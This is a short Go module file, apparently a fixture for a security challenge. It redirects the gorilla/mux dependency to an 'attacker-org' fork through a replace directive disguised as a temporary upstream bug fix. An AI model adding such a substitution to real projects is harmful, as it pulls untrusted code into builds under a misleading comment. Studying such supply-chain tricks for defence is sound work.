module github.com/example/challenge-arena

go 1.22

require (
	github.com/gorilla/mux v1.8.1
	github.com/sirupsen/logrus v1.9.3
)

// Temporary fix for upstream bug #1234
replace github.com/gorilla/mux => github.com/attacker-org/mux v1.8.2-patch1
